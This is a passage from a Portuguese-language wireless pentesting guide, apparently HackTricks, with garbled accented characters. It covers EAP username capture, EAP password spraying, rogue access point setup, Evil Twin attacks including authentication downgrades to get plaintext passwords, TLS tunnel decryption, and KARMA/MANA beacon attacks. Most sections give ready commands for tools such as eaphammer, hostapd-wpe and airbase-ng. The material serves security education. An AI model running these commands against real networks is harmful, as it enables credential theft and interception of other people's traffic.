Voc√™ pode encontrar mais informa√ß√µes sobre esses m√©todos de autentica√ß√£o [aqui](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol) e [aqui](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Captura de Nome de Usu√°rio

Lendo [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27), parece que se voc√™ estiver usando **EAP**, as mensagens de **"Identidade"** devem ser **suportadas**, e o **nome de usu√°rio** ser√° enviado em **texto claro** nas mensagens de **"Resposta de Identidade"**.

Mesmo usando um dos m√©todos de autentica√ß√£o mais seguros: **PEAP-EAP-TLS**, √© poss√≠vel **capturar o nome de usu√°rio enviado no protocolo EAP**. Para fazer isso, **capture uma comunica√ß√£o de autentica√ß√£o** (inicie o `airodump-ng` em um canal e o `wireshark` na mesma interface) e filtre os pacotes por `eapol`.\
Dentro do pacote "**Resposta, Identidade**", o **nome de usu√°rio** do cliente aparecer√°.

![](<../../.gitbook/assets/image (150).png>)

### Identidades An√¥nimas

(Informa√ß√µes retiradas de [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm))

Tanto o **EAP-PEAP** quanto o **EAP-TTLS** suportam oculta√ß√£o de identidade. Em um ambiente WiFi, o ponto de acesso (AP) geralmente gera uma solicita√ß√£o de EAP-Identity como parte do processo de associa√ß√£o. Para preservar o anonimato, o cliente EAP no sistema do usu√°rio pode responder com informa√ß√µes apenas o suficiente para permitir que o servidor RADIUS de primeira etapa processe a solicita√ß√£o, como mostrado nos exemplos a seguir.

* _**EAP-Identity = anonymous**_

> Neste exemplo, todos os usu√°rios compartilhar√£o o pseudonome de usu√°rio "anonymous". O servidor RADIUS de primeira etapa √© um servidor EAP-PEAP ou EAP-TTLS que executa o servidor final do protocolo PEAP ou TTLS. O tipo de autentica√ß√£o interno (protegido) ser√° ent√£o tratado localmente ou encaminhado para um servidor RADIUS remoto (dom√©stico).

* _**EAP-Identity = anonymous@realm\_x**_

> Neste exemplo, os usu√°rios pertencentes a diferentes dom√≠nios ocultam sua pr√≥pria identidade, mas indicam a qual dom√≠nio pertencem para que o servidor RADIUS de primeira etapa possa encaminhar as solicita√ß√µes EAP-PEAP ou EAP-TTLS para servidores RADIUS em seus dom√≠nios dom√©sticos, que atuar√£o como o servidor PEAP ou TTLS. O servidor de primeira etapa atua puramente como um n√≥ de retransmiss√£o RADIUS.
>
> Alternativamente, o servidor de primeira etapa pode atuar como o servidor EAP-PEAP ou EAP-TTLS e processar o m√©todo de autentica√ß√£o protegido ou encaminh√°-lo para outro servidor. Essa op√ß√£o pode ser usada para configurar pol√≠ticas diferentes para diferentes dom√≠nios.

No EAP-PEAP, uma vez que o servidor PEAP e o cliente PEAP estabelecem o t√∫nel TLS, o servidor PEAP gera uma solicita√ß√£o de EAP-Identity e a transmite pelo t√∫nel TLS. O cliente responde a essa segunda solicita√ß√£o de EAP-Identity enviando uma resposta de EAP-Identity contendo a verdadeira identidade do usu√°rio pelo t√∫nel criptografado. Isso impede que qualquer pessoa que esteja interceptando o tr√°fego 802.11 descubra a verdadeira identidade do usu√°rio.

O EAP-TTLS funciona de maneira um pouco diferente. Com o EAP-TTLS, o cliente geralmente se autentica via PAP ou CHAP protegido pelo t√∫nel TLS. Nesse caso, o cliente incluir√° um atributo User-Name e um atributo Password ou CHAP-Password na primeira mensagem TLS enviada ap√≥s o estabelecimento do t√∫nel.

Com qualquer um dos protocolos, o servidor PEAP/TTLS aprende a verdadeira identidade do usu√°rio assim que o t√∫nel TLS for estabelecido. A verdadeira identidade pode estar na forma de _**usu√°rio@dom√≠nio**_ ou simplesmente _**usu√°rio**_. Se o servidor PEAP/TTLS tamb√©m estiver autenticando o _**usu√°rio**_, ele agora sabe a identidade do usu√°rio e prossegue com o m√©todo de autentica√ß√£o protegido pelo t√∫nel TLS. Alternativamente, o servidor PEAP/TTLS pode encaminhar uma nova solicita√ß√£o RADIUS para o servidor RADIUS dom√©stico do usu√°rio. Essa nova solicita√ß√£o RADIUS tem o protocolo PEAP ou TTLS removido. Se o m√©todo de autentica√ß√£o protegido for EAP, as mensagens EAP internas s√£o transmitidas para o servidor RADIUS dom√©stico sem a estrutura EAP-PEAP ou EAP-TTLS. O atributo User-Name da mensagem RADIUS de sa√≠da cont√©m a verdadeira identidade do usu√°rio - n√£o a identidade an√¥nima do atributo User-Name da solicita√ß√£o RADIUS de entrada. Se o m√©todo de autentica√ß√£o protegido for PAP ou CHAP (suportado apenas pelo TTLS), o atributo User-Name e outros atributos de autentica√ß√£o recuperados da carga √∫til TLS s√£o colocados na mensagem RADIUS de sa√≠da no lugar do atributo User-Name an√¥nimo e dos atributos EAP-Message TTLS inclu√≠dos na solicita√ß√£o RADIUS de entrada.
### EAP-Bruteforce (ataque de for√ßa bruta)

Se o cliente deve usar um **nome de usu√°rio e senha** (observe que **EAP-TLS n√£o ser√° v√°lido** neste caso), voc√™ pode tentar obter uma **lista** de **nomes de usu√°rios** (veja a pr√≥xima parte) e **senhas** e tentar **atacar por for√ßa bruta** o acesso usando o [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Voc√™ tamb√©m pode realizar esse ataque usando o `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teoria de ataques ao cliente

### Sele√ß√£o de rede e roaming

Embora o protocolo 802.11 tenha regras muito espec√≠ficas que ditam como uma esta√ß√£o pode se juntar a uma ESS, ele n√£o especifica como a esta√ß√£o deve selecionar uma ESS para se conectar. Al√©m disso, o protocolo permite que as esta√ß√µes se movam livremente entre pontos de acesso que compartilham o mesmo ESSID (porque voc√™ n√£o gostaria de perder a conectividade WiFi ao caminhar de uma extremidade de um pr√©dio para outra, etc). No entanto, o protocolo 802.11 n√£o especifica como esses pontos de acesso devem ser selecionados. Al√©m disso, embora as esta√ß√µes precisem ser autenticadas na ESS para se associarem a um ponto de acesso, o protocolo 802.11 n√£o exige que o ponto de acesso seja autenticado na esta√ß√£o.

### Listas de rede preferidas (PNLs)

Cada vez que uma esta√ß√£o se conecta a uma rede sem fio, o ESSID da rede √© armazenado na Lista de Redes Preferidas (PNL) da esta√ß√£o. A PNL √© uma lista ordenada de todas as redes √†s quais a esta√ß√£o se conectou no passado, e cada entrada na PNL cont√©m o ESSID da rede e qualquer informa√ß√£o de configura√ß√£o espec√≠fica da rede necess√°ria para estabelecer uma conex√£o.

### Varredura passiva

Em redes de infraestrutura, os pontos de acesso periodicamente transmitem quadros de beacon para anunciar sua presen√ßa e capacidades √†s esta√ß√µes pr√≥ximas. Os beacons s√£o quadros de transmiss√£o, o que significa que eles s√£o destinados a serem recebidos por todas as esta√ß√µes pr√≥ximas dentro do alcance. Os beacons incluem informa√ß√µes sobre as taxas suportadas pelo AP, capacidades de criptografia, informa√ß√µes adicionais e, o mais importante, os quadros de beacon cont√™m o ESSID do AP (desde que a transmiss√£o do ESSID n√£o esteja desativada).

Durante a varredura passiva, o dispositivo cliente ouve os quadros de beacon dos pontos de acesso pr√≥ximos. Se o dispositivo cliente receber um quadro de beacon cujo campo ESSID corresponda a um ESSID da PNL do cliente, o cliente se conectar√° automaticamente ao ponto de acesso que enviou o quadro de beacon. Em seguida, suponha que queiramos direcionar um dispositivo sem fio que n√£o esteja atualmente conectado a nenhum wireless. Se soubermos pelo menos uma entrada na PNL desse cliente, podemos for√ßar o cliente a se conectar a n√≥s simplesmente criando nosso pr√≥prio ponto de acesso com o ESSID dessa entrada.

### Sondagem ativa

O segundo algoritmo de sele√ß√£o de rede usado no 802.11 √© conhecido como Sondagem Ativa. Dispositivos clientes que usam sondagem ativa transmitem continuamente quadros de solicita√ß√£o de sondagem para determinar quais APs est√£o dentro do alcance, bem como quais s√£o suas capacidades. As solicita√ß√µes de sondagem s√£o enviadas em duas formas: direcionadas e de transmiss√£o. As solicita√ß√µes de sondagem direcionadas s√£o endere√ßadas a um ESSID espec√≠fico e s√£o a maneira do cliente verificar se uma rede espec√≠fica est√° pr√≥xima.

Clientes que usam sondagem direcionada enviar√£o solicita√ß√µes de sondagem para cada rede em sua PNL. Deve-se observar que a sondagem direcionada √© a √∫nica maneira de identificar a presen√ßa de redes ocultas pr√≥ximas. As solicita√ß√µes de sondagem de transmiss√£o funcionam quase da mesma maneira, mas s√£o enviadas com o campo SSID definido como NULL. Isso endere√ßa a solicita√ß√£o de sondagem de transmiss√£o a todos os pontos de acesso pr√≥ximos, permitindo que a esta√ß√£o verifique se alguma de suas redes preferidas est√° pr√≥xima sem revelar o conte√∫do de sua PNL.

## AP simples com redirecionamento para a Internet

Antes de explicar como realizar ataques mais complexos, ser√° explicado **como** apenas **criar** um **AP** e **redirecionar** seu **tr√°fego** para uma interface conectada **√†** **Internet**.

Usando `ifconfig -a`, verifique se a interface wlan para criar o AP e a interface conectada √† Internet est√£o presentes.

### DHCP e DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Crie um arquivo de configura√ß√£o _/etc/dnsmasq.conf_ da seguinte forma:
```
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Em seguida, **configure os IPs** e **rotas**:
```
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
E ent√£o **inicie** o dnsmasq:
```
dnsmasq -C dnsmasq.conf -d
```
### hostapd

O **hostapd** √© um daemon que implementa o ponto de acesso Wi-Fi (AP) e o autenticador para redes sem fio. Ele √© usado principalmente para criar pontos de acesso Wi-Fi em sistemas Linux.

O hostapd suporta v√°rios recursos, incluindo autentica√ß√£o baseada em EAP (Extensible Authentication Protocol), autentica√ß√£o de pr√©-compartilhamento de chave (PSK), autentica√ß√£o de chave WPA/WPA2 e muito mais. Ele tamb√©m pode ser configurado para suportar v√°rias interfaces de rede e pode ser usado em conjunto com outros softwares para criar uma solu√ß√£o completa de ponto de acesso Wi-Fi.

O hostapd √© uma ferramenta √∫til para testes de penetra√ß√£o em redes Wi-Fi, pois permite que os testadores simulem um ponto de acesso leg√≠timo e realizem ataques de autentica√ß√£o e criptografia. Ele tamb√©m pode ser usado para testar a seguran√ßa de redes Wi-Fi existentes, identificando vulnerabilidades e pontos fracos.

Para mais informa√ß√µes sobre como usar o hostapd, consulte a documenta√ß√£o oficial.
```
apt-get install hostapd
```
Crie um arquivo de configura√ß√£o _hostapd.conf:_
```
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Parar processos irritantes**, definir **modo de monitoramento** e **iniciar o hostapd**:
```
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Encaminhamento e Redirecionamento

Forwarding and redirection are techniques used in network communication to redirect traffic from one destination to another. These techniques are commonly used in the context of pentesting WiFi networks to redirect network traffic to an attacker-controlled device.

#### Forwarding

Forwarding involves redirecting network traffic from one network interface to another. This can be done at the network level or at the application level. Network-level forwarding is typically done using routing tables, where packets are forwarded based on their destination IP address. Application-level forwarding, on the other hand, involves redirecting traffic based on specific protocols or ports.

In the context of WiFi pentesting, forwarding can be used to redirect traffic from a target device to an attacker-controlled device. This allows the attacker to intercept and analyze the network traffic for further exploitation.

#### Redirection

Redirection, on the other hand, involves redirecting traffic from one URL or domain to another. This is commonly done using HTTP status codes, such as 301 (Moved Permanently) or 302 (Found). When a client receives a redirection response, it automatically sends a new request to the redirected URL.

In the context of WiFi pentesting, redirection can be used to trick users into visiting malicious websites or capturing their credentials. By redirecting the traffic from a legitimate website to a malicious one, the attacker can exploit vulnerabilities in the user's browser or steal sensitive information.

Both forwarding and redirection are powerful techniques that can be used by attackers to manipulate network traffic and deceive users. As a pentester, it is important to understand these techniques and how to defend against them.
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Um ataque de Evil Twin √© um tipo de ataque Wi-Fi que funciona aproveitando o fato de que a maioria dos computadores e telefones s√≥ ver√° o "nome" ou ESSID de uma rede sem fio (pois a esta√ß√£o base n√£o precisa se autenticar contra o cliente). Isso na verdade torna muito dif√≠cil distinguir entre redes com o mesmo nome e o mesmo tipo de criptografia. Na verdade, muitas redes ter√£o v√°rios pontos de acesso que estendem a rede, todos usando o mesmo nome para expandir o acesso sem confundir os usu√°rios.

Devido √† forma como a implementa√ß√£o dos clientes funciona (lembre-se de que o protocolo 802.11 permite que as esta√ß√µes se movam livremente entre os pontos de acesso dentro do mesmo ESS), √© poss√≠vel fazer com que um dispositivo mude a esta√ß√£o base √† qual est√° conectado. Isso √© poss√≠vel oferecendo um sinal melhor (o que nem sempre √© poss√≠vel) ou bloqueando o acesso √† esta√ß√£o base original (pacotes de desautentica√ß√£o, interfer√™ncia ou algum outro tipo de ataque DoS).

Observe tamb√©m que as implanta√ß√µes de redes sem fio no mundo real geralmente t√™m mais de um ponto de acesso, e esses pontos de acesso geralmente s√£o mais poderosos e t√™m melhor alcance de linha de vis√£o devido √† sua coloca√ß√£o no teto. Desautenticar um √∫nico ponto de acesso geralmente resulta no alvo se movendo para outro ponto de acesso v√°lido em vez do seu AP falso, a menos que todos os pontos de acesso pr√≥ximos sejam desautenticados (alto) ou voc√™ seja muito cuidadoso com a coloca√ß√£o do AP falso (dif√≠cil).

Voc√™ pode criar um Evil Twin b√°sico aberto (sem capacidade de rotear tr√°fego para a Internet) fazendo:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Voc√™ tamb√©m pode criar um Evil Twin usando o **eaphammer** (observe que para criar evil twins com o eaphammer, a interface **N√ÉO DEVE ESTAR** no modo **monitor**):
```
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ou usando o Airgeddon: `Op√ß√µes: 5,6,7,8,9 (dentro do menu de ataque Evil Twin).`

![](<../../.gitbook/assets/image (148).png>)

Por favor, observe que por padr√£o, se um ESSID na PNL estiver salvo como protegido por WPA, o dispositivo n√£o se conectar√° automaticamente a um Evil Twin aberto. Voc√™ pode tentar fazer um DoS no AP real e esperar que o usu√°rio se conecte manualmente ao seu Evil Twin aberto, ou voc√™ pode fazer um DoS no AP real e usar um Evil Twin com WPA para capturar o handshake (usando esse m√©todo, voc√™ n√£o poder√° permitir que a v√≠tima se conecte a voc√™, pois voc√™ n√£o conhece a PSK, mas pode capturar o handshake e tentar quebr√°-lo).

_Alguns sistemas operacionais e antiv√≠rus avisar√£o o usu√°rio de que se conectar a uma rede aberta √© perigoso..._

### Evil Twin WPA/WPA2

Voc√™ pode criar um **Evil Twin usando WPA/2** e se os dispositivos estiverem configurados para se conectar a esse SSID com WPA/2, eles tentar√£o se conectar. No entanto, **para completar o handshake de 4 vias**, voc√™ tamb√©m precisa **saber** a **senha** que o cliente vai usar. Se voc√™ **n√£o souber**, a **conex√£o n√£o ser√° conclu√≠da**.
```
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Evil Twin Empresarial

Para entender esses ataques, recomendo ler antes a breve explica√ß√£o sobre [WPA Enterprise](./#wpa-enterprise-mgt).

**Usando o hostapd-wpe**

O `hostapd-wpe` precisa de um arquivo de **configura√ß√£o** para funcionar. Para **automatizar** a gera√ß√£o dessas configura√ß√µes, voc√™ pode usar [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) (fa√ßa o download do arquivo python dentro de _/etc/hostapd-wpe/_)
```
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
No arquivo de configura√ß√£o, voc√™ pode selecionar v√°rias coisas diferentes, como ssid, canal, arquivos de usu√°rio, credenciais/chave, par√¢metros dh, vers√£o wpa e autentica√ß√£o...

[**Usando o hostapd-wpe com EAP-TLS para permitir qualquer certificado para fazer login.**](evil-twin-eap-tls.md)

**Usando o EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Por padr√£o, o EAPHammer utiliza os seguintes m√©todos de autentica√ß√£o (observe que o GTC √© o primeiro a ser utilizado para obter senhas em texto simples e, em seguida, s√£o utilizados m√©todos de autentica√ß√£o mais robustos):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Esta √© a metodologia padr√£o para evitar tempos de conex√£o longos. No entanto, voc√™ tamb√©m pode especificar para o servidor os m√©todos de autentica√ß√£o do mais fraco para o mais forte:
```
--negotiate weakest
```
Ou voc√™ tamb√©m pode usar:

* `--negotiate gtc-downgrade` para usar uma implementa√ß√£o de downgrade GTC altamente eficiente (senhas em texto simples)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` para especificar manualmente os m√©todos oferecidos (oferecer os mesmos m√©todos de autentica√ß√£o na mesma ordem que a organiza√ß√£o tornar√° o ataque muito mais dif√≠cil de detectar).
* [Encontre mais informa√ß√µes no wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Usando o Airgeddon**

`Airgeddon` pode usar certificados previamente gerados para oferecer autentica√ß√£o EAP a redes WPA/WPA2-Enterprise. A rede falsa ir√° rebaixar o protocolo de conex√£o para EAP-MD5, para que seja poss√≠vel **capturar o usu√°rio e o MD5 da senha**. Posteriormente, o atacante pode tentar quebrar a senha.\
`Airggedon` oferece a possibilidade de um **ataque Evil Twin cont√≠nuo (ruidoso)** ou **apenas criar o ataque Evil at√© que algu√©m se conecte (suave).**

![](<../../.gitbook/assets/image (129).png>)

### Depurando t√∫neis TLS PEAP e EAP-TTLS em ataques Evil Twins

_Este m√©todo foi testado em uma conex√£o PEAP, mas como estou descriptografando um t√∫nel TLS arbitr√°rio, isso tamb√©m deve funcionar com EAP-TTLS_

Dentro da **configura√ß√£o** do _hostapd-wpe_, **comente** a linha que cont√©m _**dh\_file**_ (de `dh_file=/etc/hostapd-wpe/certs/dh` para `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Isso far√° com que o `hostapd-wpe` **troque chaves usando RSA** em vez de DH, para que voc√™ possa **descriptografar** o tr√°fego posteriormente, **conhecendo a chave privada do servidor**.

Agora inicie o **Evil Twin** usando o **`hostapd-wpe`** com essa configura√ß√£o modificada como de costume. Tamb√©m inicie o **`wireshark`** na **interface** que est√° realizando o ataque Evil Twin.

Agora ou mais tarde (quando voc√™ j√° tiver capturado algumas tentativas de autentica√ß√£o), voc√™ pode adicionar a chave privada RSA ao wireshark em: `Editar --> Prefer√™ncias --> Protocolos --> TLS --> (Lista de chaves RSA) Editar...`

Adicione uma nova entrada e preencha o formul√°rio com os seguintes valores: **Endere√ßo IP = qualquer** -- **Porta = 0** -- **Protocolo = dados** -- **Arquivo de chave** (**selecione seu arquivo de chave**, para evitar problemas, selecione um arquivo de chave **sem prote√ß√£o por senha**).

![](<../../.gitbook/assets/image (151).png>)

E observe a nova aba **"TLS Descriptografado"**:

![](<../../.gitbook/assets/image (152).png>)

## Ataque KARMA, MANA, Loud MANA e Beacons conhecidos

### Listas negras e brancas de ESSID e MAC

A tabela a seguir lista os diferentes tipos de MFACLs (Listas de Controle de Acesso a Quadros de Gerenciamento) dispon√≠veis, bem como seus efeitos quando usados:

![](<../../.gitbook/assets/image (149).png>)
```
# example EAPHammer MFACL file, wildcards can be used
78:f0:97:fc:b5:36
9a:35:e1:01:4f:cf
69:19:14:60:20:45
ce:52:b8:*:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```
# example ESSID-based MFACL file
apples
oranges
grapes
pears

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Os ataques Karma s√£o uma segunda forma de ataque de ponto de acesso falso que explora o processo de sele√ß√£o de rede usado pelas esta√ß√µes. Em um whitepaper escrito em 2005, Dino Dai Zovi e Shane Macaulay descrevem como um atacante pode configurar um ponto de acesso para ouvir solicita√ß√µes de sonda direcionadas e responder a todas elas com respostas de sonda direcionadas correspondentes. Isso faz com que as esta√ß√µes afetadas enviem automaticamente uma solicita√ß√£o de associa√ß√£o para o ponto de acesso do atacante. O ponto de acesso ent√£o responde com uma resposta de associa√ß√£o, fazendo com que as esta√ß√µes afetadas se conectem ao atacante.

### MANA

De acordo com Ian de Villiers e Dominic White, as esta√ß√µes modernas s√£o projetadas para se proteger contra ataques Karma, ignorando respostas de sonda direcionadas de pontos de acesso que ainda n√£o responderam a pelo menos uma solicita√ß√£o de sonda de transmiss√£o. Isso levou a uma queda significativa no n√∫mero de esta√ß√µes vulner√°veis a ataques Karma at√© 2015, quando White e de Villiers desenvolveram um meio de contornar tais prote√ß√µes. No aprimoramento do ataque Karma de White e de Villiers (ataque MANA), as respostas de sonda direcionadas s√£o usadas para reconstruir as PNLs das esta√ß√µes pr√≥ximas. Quando uma solicita√ß√£o de sonda de transmiss√£o √© recebida de uma esta√ß√£o, o ponto de acesso do atacante responde com um SSID arbitr√°rio da PNL da esta√ß√£o que j√° foi visto em uma sonda direcionada desse dispositivo.

Resumindo, o algoritmo MANA funciona da seguinte maneira: cada vez que o ponto de acesso recebe uma solicita√ß√£o de sonda, ele primeiro determina se √© uma sonda de transmiss√£o ou direcionada. Se for uma sonda direcionada, o endere√ßo MAC do remetente √© adicionado √† tabela de hash (se ainda n√£o estiver l√°) e o ESSID √© adicionado √† PNL desse dispositivo. O ponto de acesso ent√£o responde com uma resposta de sonda direcionada. Se for uma sonda de transmiss√£o, o ponto de acesso responde com respostas de sonda para cada uma das redes na PNL desse dispositivo.

Ataque MANA usando o eaphammer:
```
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Ataque Loud MANA

Observe que o ataque MANA padr√£o ainda n√£o nos permite atacar dispositivos que n√£o usam sondagem direcionada. Portanto, se tamb√©m n√£o conhecemos previamente nenhuma entrada dentro do PNL do dispositivo, precisamos encontrar outra maneira de atac√°-lo.

Uma possibilidade √© o que √© chamado de ataque Loud MANA. Esse ataque se baseia na ideia de que dispositivos clientes em proximidade f√≠sica pr√≥xima provavelmente t√™m pelo menos algumas entradas em comum em seus PNLs.

Resumidamente, o ataque Loud MANA, em vez de responder √†s solicita√ß√µes de sondagem com cada ESSID no PNL de um dispositivo espec√≠fico, o AP falso envia respostas de sondagem para cada ESSID em todos os PNLs de todos os dispositivos que ele j√° viu antes. Relacionando isso √† teoria dos conjuntos, podemos dizer que o AP envia respostas de sondagem para cada ESSID na uni√£o de todos os PNLs dos dispositivos pr√≥ximos.
```
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Ataque Beacon Conhecido

Ainda existem casos em que o ataque Loud MANA n√£o ter√° sucesso. O ataque Beacon Conhecido √© uma forma de "For√ßa Bruta" de ESSIDs para tentar fazer com que a v√≠tima se conecte ao atacante. O atacante cria um AP que responde a qualquer ESSID e executa algum c√≥digo enviando beacons falsificando ESSIDs de cada nome dentro de uma lista de palavras. Esperan√ßosamente, a v√≠tima cont√©m alguns desses nomes de ESSID em sua PNL e tentar√° se conectar ao AP falso. O Eaphammer implementou esse ataque como um ataque MANA, onde todos os ESSIDs dentro de uma lista s√£o carregados (voc√™ tamb√©m pode combinar isso com `--loud` para criar um ataque Loud MANA + Beacon Conhecido):
```
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Ataque de Beacon Burst conhecido**

Como os beacons conhecidos s√£o chamativos. Voc√™ pode usar um script dentro do projeto Eaphammer para lan√ßar rapidamente beacons com o nome de cada ESSID em um arquivo. Se voc√™ combinar esse script com um ataque MANA do Eaphammer, os clientes poder√£o se conectar ao seu AP.
```
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

O Wi-Fi Direct √© um padr√£o de Wi-Fi que permite que dispositivos se conectem entre si sem um ponto de acesso sem fio, pois um dos dois dispositivos atuar√° como AP (chamado de propriet√°rio do grupo). Voc√™ pode encontrar o Wi-Fi Direct em muitos dispositivos IoT, como impressoras, TVs...

O Wi-Fi Direct depende do Wi-Fi Protected Setup (WPS) para conectar os dispositivos com seguran√ßa. O WPS possui v√°rios m√©todos de configura√ß√£o, como Configura√ß√£o por Bot√£o de Press√£o (PBC), entrada de PIN e Comunica√ß√£o de Campo Pr√≥ximo (NFC).

Portanto, os ataques anteriormente vistos ao PIN do WPS tamb√©m s√£o v√°lidos aqui se o PIN for usado.

### Sequestro do EvilDirect

Isso funciona como um Evil-Twin, mas para o Wi-Fi Direct, voc√™ pode se passar por um propriet√°rio de grupo para tentar fazer com que outros dispositivos, como telefones, se conectem a voc√™: `airbase-ng -c 6 -e DIRECT-5x-BRAVIA -a BB:BB:BB:BB:BB:BB mon0`

## Refer√™ncias

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)

TODO: D√™ uma olhada em [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login com Facebook e imita√ß√£o de WPA em portais cativos)

<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof √© o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof s√£o lan√ßadas apenas quando seus clientes depositam o or√ßamento de recompensa. Voc√™ receber√° a recompensa ap√≥s a verifica√ß√£o do bug.

**Adquira experi√™ncia em pentesting web3**\
Protocolos de blockchain e contratos inteligentes s√£o a nova Internet! Domine a seguran√ßa web3 em seus dias de ascens√£o.

**Torne-se a lenda do hacker web3**\
Ganhe pontos de reputa√ß√£o com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? Ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
